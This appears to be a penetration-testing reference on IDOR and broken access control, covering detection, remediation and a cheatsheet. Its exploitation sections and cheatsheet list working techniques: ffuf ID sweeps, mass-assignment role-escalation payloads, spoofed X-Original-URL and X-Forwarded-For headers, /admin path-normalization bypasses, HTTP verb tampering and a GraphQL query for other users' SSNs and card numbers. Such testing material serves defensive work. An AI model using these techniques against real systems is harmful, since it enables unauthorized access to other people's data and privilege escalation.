# IDOR & Broken Access Control

Broken Access Control is **#1 in the OWASP Top 10 (A01:2021)** and the single most reported class in bug bounty. It covers any case where a user can act on data or functionality they should not be able to. **IDOR** (Insecure Direct Object Reference) is the most common sub-type: the app exposes a reference to an internal object (a DB id, filename, account number) and fails to verify the caller is authorized for *that specific object*.

---

## Taxonomy

| Sub-class | Description |
|-----------|-------------|
| **IDOR (horizontal)** | Access another user's object at the same privilege level (read/modify their order, profile, message) |
| **IDOR (vertical)** | Reach higher-privilege objects/actions (other tenants, admin records) |
| **Function-level (vertical priv-esc)** | Call an admin endpoint as a normal user (`/admin/*`, hidden API methods) |
| **Forced browsing** | Access pages/files not linked but not protected (`/admin`, `/backup.zip`) |
| **Parameter-based access control** | Role decided by a client-controlled value (`?role=admin`, JWT claim, cookie) |
| **Multi-step process flaws** | Skip a step / tamper with state between steps |
| **Platform misconfig** | Method-based bypass (POST blocked but PUT/PATCH allowed), header-based trust |

---

## Detection methodology

1. **Enumerate every object reference** in requests: numeric ids, UUIDs, usernames, emails, filenames, `account_id`, `order_id`, hashes, base64 blobs.
2. **Two-account testing**: create User A and User B. Capture A's authenticated request, replay it with B's session but A's object id (and vice versa). If it works → IDOR.
3. **Map the full API surface** (Burp sitemap, JS files, mobile app, GraphQL introspection, Swagger/OpenAPI, `robots.txt`, `sitemap.xml`).
4. **Test all HTTP methods** on each endpoint (GET/POST/PUT/PATCH/DELETE/OPTIONS).
5. **Diff authenticated vs. unauthenticated** and **admin vs. user** responses.

```bash
# Pull JS to mine hidden endpoints & ids
katana -u https://TARGET -jc -d 3 | tee urls.txt
gau TARGET | grep -Ei 'id=|user=|account=|uuid=|order='
# linkfinder for endpoints in JS
python3 linkfinder.py -i https://TARGET/app.js -o cli
```

---

## Exploitation

### Classic numeric IDOR

```http
GET /api/v1/users/1024/invoice HTTP/1.1
Cookie: session=<USER_B>

# Iterate the id with User B's session
GET /api/v1/users/1023/invoice   -> someone else's invoice
```

```bash
# Burp Intruder or ffuf to sweep IDs
ffuf -u "https://TARGET/api/users/FUZZ/profile" -w <(seq 1 5000) \
  -H "Cookie: session=$B" -mc 200 -fs 0 -ac
```

### UUID / non-sequential ids

GUIDs are not access control. Hunt for leaked ids:

```text
- Other endpoints that disclose ids (search, autocomplete, /api/users list, error messages)
- Predictable/timestamp-based UUIDv1 (extract MAC + time)
- Referer/email/notification links, exported CSVs, websocket messages
- Re-use of an id you legitimately own in a sibling resource
```

### Encoded / hashed references

```bash
# base64 id -> decode, change, re-encode
echo "eyJpZCI6MTAyNH0=" | base64 -d   # {"id":1024}
echo -n '{"id":1025}' | base64
# Predictable hashes: try md5(email), md5(id), sequential after decode
```

### Mass-assignment / parameter pollution

```http
# Add fields the UI never sends to escalate role / ownership
PATCH /api/users/me HTTP/1.1
{"name":"me","role":"admin","isAdmin":true,"account_id":1}

# Parameter pollution
POST /update?user_id=VICTIM&user_id=ME
GET /api/data?id=ME&id=VICTIM
```

### Function-level (vertical) bypass

```http
# Direct admin endpoint as normal user
GET /admin/deleteUser?id=5
GET /api/admin/users
POST /admin/api/promote {"user":"me"}

# Method override / verb tampering
POST /admin/users/5      (403)
PUT  /admin/users/5      (200)  <- try every verb
X-HTTP-Method-Override: DELETE
```

### Header / path-based access bypass

```http
# Trusted-header spoof (app trusts edge headers)
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: localhost
X-Custom-IP-Authorization: 127.0.0.1
Referer: https://TARGET/admin

# Path-normalization bypass of a /admin block
/admin%2f..%2fadmin/      /Admin/      /admin/.       /admin..;/
/admin%00      /admin/%2e/      /./admin      /admin#
/api/./admin      //admin//
```

### Multi-tenant / org-scoped IDOR

```http
# Swap tenant/org id while keeping your auth
GET /api/org/<YOUR_ORG>/reports   ->  /api/org/<OTHER_ORG>/reports
# Often the auth check validates the session but not the org binding
```

### GraphQL access control (see api-graphql.md)

```graphql
# Query another user's data directly by id, fields lack per-field authz
query { user(id:"1025"){ email ssn paymentMethods { number } } }
```

---

## Real-world bypass patterns

- **Read blocked, write allowed** (or vice versa) — test both directions on the same id.
- **2FA / email-change confirmation IDOR** — confirm-token bound to wrong account.
- **Export/print/PDF endpoints** often skip authz that the HTML view enforces.
- **"Soft" hiding** — UI hides a button but the API still accepts the call.
- **Old API versions** (`/v1/` vs `/v2/`) where authz was added only to the new one.
- **Bulk/batch endpoints** that authorize the first item but loop over all.
- **Race conditions** in approval/limit checks (use Burp Turbo Intruder single-packet attack).

---

## Tooling

| Tool | Use |
|------|-----|
| **Burp Suite** (Repeater + **Autorize** / **AuthMatrix** / **Auth Analyzer**) | Replay every request with a low-priv/no session, auto-flag authz gaps |
| **Burp Intruder / ffuf** | ID sweeping |
| **Turbo Intruder** | Race conditions, single-packet attacks |
| **Param Miner** | Discover hidden params for mass-assignment |
| **katana / gau / linkfinder** | Endpoint & id discovery from JS |
| **Postman / OpenAPI** | Exercise full API method matrix |

**Autorize workflow**: log in as the low-priv user, set its cookies/token in Autorize, then browse as the high-priv user — Autorize replays each request with the low-priv identity and marks `Bypassed!` where access wasn't enforced.

---

## Remediation

- Enforce **object-level authorization** server-side on every request: `WHERE id=? AND owner_id=session.user`.
- Deny by default; centralize access checks (don't scatter per-endpoint).
- Use unpredictable references **as defense in depth only** — never as the access control itself.
- Validate role/tenant from the server-side session, never from a client-supplied field, header, or unsigned token.
- Add automated authz tests in CI (two-actor request replay).

---

## Cheatsheet

```text
# Two-account replay: A's request + B's session
# Sweep numeric ids
ffuf -u https://T/api/u/FUZZ -w <(seq 1 9999) -H "Cookie: $B" -mc 200
# Method tamper
PUT/PATCH/DELETE on a 403 endpoint; X-HTTP-Method-Override: DELETE
# Header trust
X-Original-URL: /admin | X-Forwarded-For: 127.0.0.1 | X-Forwarded-Host: localhost
# Path bypass of /admin filter
/admin/. | /admin%2f..%2fadmin | /Admin | //admin// | /admin..;/
# Mass assignment
{"role":"admin","isAdmin":true}
# Param pollution
?id=ME&id=VICTIM
# base64 id flip
echo ID|base64 -d -> edit -> base64
```

---

## References

- OWASP A01:2021 Broken Access Control: https://owasp.org/Top10/A01_2021-Broken_Access_Control/
- PortSwigger — Access control vulnerabilities: https://portswigger.net/web-security/access-control
- PortSwigger — IDOR: https://portswigger.net/web-security/access-control/idor
- PayloadsAllTheThings — IDOR: https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Direct%20Object%20References/
- HackTricks — IDOR: https://hacktricks.wiki/en/pentesting-web/idor.html
- OWASP API Security Top 10 (BOLA/BFLA): https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/
- Burp Autorize: https://github.com/PortSwigger/autorize
